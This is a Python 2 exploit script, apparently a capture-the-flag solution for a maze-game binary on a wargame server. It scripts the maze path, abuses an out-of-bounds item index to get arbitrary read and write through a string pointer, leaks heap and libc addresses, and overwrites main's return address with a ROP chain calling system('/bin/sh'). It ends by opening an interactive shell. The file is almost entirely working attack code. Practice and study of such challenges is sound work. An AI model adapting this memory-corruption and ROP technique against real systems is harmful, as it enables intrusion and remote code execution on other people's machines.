from socket import *
from struct import *
import telnetlib
from collections import deque

PQ = lambda x: pack('<Q', x)
UPQ = lambda x: unpack('<Q', x)[0]


def rd(t):
    r = ''
    while t not in r:
        c = s.recv(1)
        if not c:
            break

        r += c

    return r


def get_path(node):
    path = []
    while(node != None):
        path.append((node[0], node[1]))
        node = node[2]
    return path

def bfs(x, y, map):
    queue = deque( [(x, y, None)])
    while len(queue)>0:
        node = queue.popleft()
        x = node[0]
        y = node[1]
        if map[x][y] == '!':
            return get_path(node)

        if map[x][y] != ' ':
            continue

        map[x][y] = 'X'
        for i in [[x-1, y], [x+1, y], [x, y-1], [x, y+1]]:
            queue.append((i[0], i[1], node))
    return []

def make_direction(path):
    prev_x, prev_y = path.pop()

    direction = ''
    for x, y in path[::-1]:
        if x > prev_x:
            direction += 'd'
        elif x < prev_x:
            direction += 'u'
        elif y > prev_y:
            direction += 'r'
        elif y < prev_y:
            direction += 'l'
        prev_x, prev_y = x, y

    return direction


def use_item(item_index, storage_index):
    s.send('i\n')
    rd('> ')
    s.send('%d\n' % item_index)
    rd('> ')
    s.send('%d\n' % storage_index)
    return rd('menu> ')

def get_byte_index(data, byte):
    try:
        idx = int(data.split(': ' + hex(byte))[0].split('\n')[-1])
        return idx
    except:
        print('no byte found...')
        exit(0)

def get_name():
    s.send('n\n')
    data = rd('menu> ')
    print data
    return data.split('name: ')[1].split('\n')[0]

def change_name(name):
    s.send('c\n')
    rd('> ')
    s.send(name)
    return rd('menu> ')


def get_byte_list():
    s.send('v\n')
    table = rd('menu> ')
    return table

bytes_table = []

if __name__ == '__main__':
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(('wargame.dev', 9003))

    rd('\n')
    rd('\n')

    result = ''
    for _ in range(32):
        result += rd('\n').split('\t')[1]

    print result
    rd('menu> ')
    map_data = []
    for line in result.split('\n'):
        if not line:
            break

        line_array = [c for c in line]
        map_data.append(line_array)


    map_data[1][1] = ' '
    path = bfs(1, 1, map_data)
    direction = make_direction(path)

    for cmd in direction:
        s.send('%s\n' % cmd)
        rd('menu> ')

    s.send('s\n')
    rd('menu> ')
    def get_byte_until(expect_byte):
        if expect_byte in bytes_table:
            return

        player_upper_map_idx = -0x48f
        while True:
            print 'get item byte...',
            use_item(0, player_upper_map_idx)
            s.send('u\n')
            data = rd('menu> ')
            byte = int(data.split('You got ')[1].split(' ')[0], 16)
            print hex(byte)
            s.send('d\n')
            rd('menu> ')
            bytes_table.append(byte)

            if byte == expect_byte:
                print 'found expect byte!'
                break

    get_byte_until(0x50)
    get_byte_until(0x98)


    table = get_byte_list()
    std_string_idx = -0x48
    use_item(get_byte_index(table, 0x50), std_string_idx)
    heap_address = UPQ(get_name().ljust(8, '\x00'))
    print 'heap_address', hex(heap_address)

    use_item(get_byte_index(table, 0x98), std_string_idx)
    main_arena = UPQ(get_name().ljust(8, '\x00'))
    libc_base = main_arena - 0x3c4b88
    libc_system = libc_base + 0x45390
    environ = libc_base + 0x3c6f38
    print 'main_arena', hex(main_arena)
    print 'libc_base', hex(libc_base)

    for i in range(8):
        get_byte_until(ord(PQ(environ)[i]))

    table = get_byte_list()
    for i in range(8):
        use_item(get_byte_index(table, ord(PQ(environ)[i])), std_string_idx + i)

    environ_addr = UPQ(get_name().ljust(8, '\x00'))
    main_ret_addr = environ_addr - 0xf0
    print 'environ', hex(environ_addr)

    use_item(get_byte_index(table, 0x50), std_string_idx + 8)

    prdi = libc_base + 0xDDCEF
    binsh = libc_base + 0x18CD57

    def write0x50(addr, data):
        for i in range(8):
            use_item(get_byte_index(table, ord(PQ(addr)[i])), std_string_idx + i)
        change_name(data)


    payload = ''
    payload += PQ(prdi)
    payload += PQ(binsh)
    payload += PQ(libc_system)

    for i in range(8):
        get_byte_until(ord(PQ(main_ret_addr)[i]))

    table = get_byte_list()
    write0x50(main_ret_addr, payload)

    s.send('e\n')
    s.send('id\n')

    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
